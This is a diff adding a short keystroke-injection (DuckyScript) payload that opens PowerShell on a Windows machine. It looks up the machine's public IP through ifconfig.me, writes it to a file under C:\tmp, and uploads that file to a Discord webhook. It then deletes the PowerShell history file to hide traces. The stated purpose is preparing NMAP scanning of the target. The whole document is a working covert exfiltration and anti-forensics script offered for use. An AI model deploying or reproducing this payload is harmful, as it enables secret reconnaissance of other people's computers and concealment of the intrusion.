@@ -1,0 +1,12 @@
+REM TITLE Enumerate Public IP Address
+REM AUTHOR xBy0S
+REM DESCRIPTION Aquire the Public IP for NMAP Scanning and Send it to Discord
+DELAY 500
+GUI r
+STRING powershell
+ENTER
+DELAY 500
+STRING $webhook='<ENTER WEBHOOK>'; $IP = ((Invoke-WebRequest ifconfig.me/ip).Content.Trim()); New-Item -Path "C:\" -Name "tmp" -ItemType "Directory" -Recurse -Force;$Random = Get-Random -Minimum 100000 -Maximum 999999; $IP | Out-File "C:\tmp\PublicIP_$Random.txt"; curl -F "file1=@C:\tmp\PublicIP_$Random.txt" $webhook; $history=(Get-PSReadlineOption).HistorySavePath; Remove-Item $history -recurse -force
+ENTER
+STRING EXIT
+ENTER
